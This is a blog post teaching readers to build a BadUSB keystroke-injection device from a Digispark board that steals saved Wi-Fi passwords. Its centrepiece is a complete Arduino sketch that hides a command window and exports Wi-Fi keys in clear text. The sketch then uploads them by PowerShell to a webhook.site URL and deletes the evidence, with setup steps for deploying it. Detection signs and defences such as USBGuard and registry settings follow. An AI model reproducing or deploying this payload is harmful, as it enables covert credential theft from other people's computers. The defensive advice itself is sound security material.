---
title: "Steal WIFI Password with bad USB ⚠️"
date: 2025-03-14 15:04:02 +0330
categories: [USB Attack , Cybersecurity]
tags: [Powershell, USB, Digispark,Hack]
description: "How to extract the system WIFI password using bad usb
Code + Protect Attack + USB GUARD"
image: assets/img/usb attack/usb.jpg
---

# USB Attack 

## 🛡️Overview
- **1. Today we are going to program the digi spark board so that it can send WiFi passwords to the hacker**
- **2. The design and operation of this training is very simple in this area and has been passed for your testing and awareness**
- **3. These attacks are physical and can be very dangerous.**
- 
### 🔍 What is a HID attack?
**HID** attacks are usually carried out by small devices such as the **Digispark ATTiny85**. When connected to a computer, these devices present themselves as a keyboard or mouse and execute **predefined commands** without the user's permission. Examples of these attacks include:
- Running **malicious PowerShell commands**
- Stealing sensitive information (such as Wi-Fi passwords and browser information)
- Downloading and executing malware
- Changing system security settings

---
## Requirements :
Ability to work with IDE & Library
- **[DigiSpark Board](https://www.aliexpress.com/item/2040316211.html?src=google&pdp_npi=4%40dis!EUR!3.48!3.48!!!!!%40!58307777832!ppc!!!&src=google&albch=shopping&acnt=298-731-3000&isdl=y&slnk=&plac=&mtctp=&albbt=Google_7_shopping&aff_platform=google&aff_short_key=UneMJZVf&gclsrc=aw.ds&&albagn=888888&&ds_e_adid=&ds_e_matchtype=&ds_e_device=c&ds_e_network=x&ds_e_product_group_id=&ds_e_product_id=en2040316211&ds_e_product_merchant_id=107407105&ds_e_product_country=FI&ds_e_product_language=en&ds_e_product_channel=online&ds_e_product_store_id=&ds_url_v=2&albcp=21554396823&albag=&isSmbAutoCall=false&needSmbHouyi=false&gad_source=1&gclid=CjwKCAjwp8--BhBREiwAj7og10doGVUDznQLYsg_BZjGRzoUpIk65lCJv6CeL4CorOxbgnRpF7wWGRoCewQQAvD_BwE)**
- **[Arduino IDE](https://www.arduino.cc/en/software)**<br>
- **[DigiKeyboardFr](https://github.com/Robotechnic/DigiKeyboardFr)**
- **[DigiKeyboardBe](https://github.com/IncroyablePix/DigiKeyboardBe)**


---
# Code
```cpp
#include "DigiKeyboard.h"
#define KEY_DOWN 0x51
#define KEY_ENTER 0x28
void setup() {
  
pinMode(1, OUTPUT);
}

void loop() {
  DigiKeyboard.update();
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(200);
 
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(100);
  DigiKeyboard.println("cmd /k mode con: cols=15 lines=1");
  DigiKeyboard.delay(700);
  DigiKeyboard.delay(700);
  DigiKeyboard.sendKeyStroke(KEY_SPACE, MOD_ALT_LEFT); 
  DigiKeyboard.sendKeyStroke(KEY_M); 
  for(int i =0; i < 110; i++)
    {
      DigiKeyboard.sendKeyStroke(KEY_DOWN); 
    }
  DigiKeyboard.sendKeyStroke(KEY_ENTER); 
  DigiKeyboard.delay(100);
  DigiKeyboard.println("cd %temp%"); 
  DigiKeyboard.delay(700);
  DigiKeyboard.println("netsh wlan export profile key=clear"); 
  DigiKeyboard.delay(700);
  DigiKeyboard.println("powershell Select-String -Path Wi*.xml -Pattern 'keyMaterial' > Wi-Fi-PASS");
  DigiKeyboard.delay(700);
  DigiKeyboard.println("powershell Invoke-WebRequest -Uri https://webhook.site/YourToken -Method POST -InFile Wi-Fi-PASS");
  DigiKeyboard.delay(700);
  DigiKeyboard.println("del Wi-* /s /f /q"); 
  DigiKeyboard.delay(100);
  DigiKeyboard.println("exit");
  DigiKeyboard.delay(100);
  
  digitalWrite(1, HIGH); 
  DigiKeyboard.delay(90000);
  digitalWrite(1, LOW); 
  DigiKeyboard.delay(5000);
}

```
### Webhook
- **Go to the [Webhook](https://webhook.site/) and copy your url and paste it in line 33 of the yourtoken section of the code. Then upload the code to the board**
![webhook](assets/img/usb attack/webhook.png)
### Final
- **Connect the board to the system and be patient until the work is done and finally go to the webhook.**
![final](assets/img/usb attack/final.png)
---
## ⚠️ HID Attack Indicators
If a device has connected to your system without your knowledge and you're noticing unusual behavior, you might be under a HID attack. Some signs of this attack include:
- Sudden opening of CMD or PowerShell
- Unusual mouse movement or automatic text typing
- Creation of unknown files on the system
- Activation of suspicious internet connections
- 
---
## 🛑 Ways to prevent HID attacks
### 1. **Disable suspicious USB devices** 🚫
You can disable the ability to accept new HID devices in Windows:
```powershell
reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\USBHID /v Start /t REG_DWORD /d 4 /f
```
### 2. **Use security software** 🛡️
Software such as **USBGuard** and **NoHID** can prevent HID devices from running automatically.
- **USBGuard (Linux only)**:
```bash
sudo apt install usbguard
```
- **NoHID for Windows**: You can use software such as **G Data USB Keyboard Guard**.

### 3. **Enable security settings in BIOS/UEFI** ⚙️
Many motherboards have the ability to **disable unnecessary USB ports**. By entering BIOS/UEFI settings, you can:
- **Disable unnecessary USB ports**.
- **Allow access only to known devices**.

### 4. **Use a Data-Only USB Adapter** 🔌
There are special USB adapters that **only allow power transfer and block data transfer**.

### 5. **Monitor system logs** 📊
Using tools like **Event Viewer on Windows** and **dmesg on Linux**, you can find out what devices are connected to your system.
```powershell
Get-PnpDevice -PresentOnly | Where-Object { $_.InstanceId -match '^USB' }
```

---
## 📢 Resources and Useful Links
- [USBGuard GitHub](https://github.com/dkopecek/usbguard)
- [G Data USB Keyboard Guard](https://www.gdata.de/usb-keyboard-guard)


---
##  Disclaimer 🤝
This document and its accompanying code are provided for **educational purposes only**. The author is not responsible for any misuse or damage caused by the use of this information.

---
## 📡 Social Media 
[![Telegram](https://img.shields.io/badge/Telegram-Join-blue)](https://t.me/i2xam1r)  
[![Instagram](https://img.shields.io/badge/Instagram-Follow-red)](https://instagram.com/2xam1r)  
[![GitHub](https://img.shields.io/badge/GitHub-View-black)](https://github.com/i2xam1r)

[![Discord server](https://discordapp.com/api/guilds/938143724565835848/embed.png?style=banner3)](https://discord.gg/WtPzSe94)

---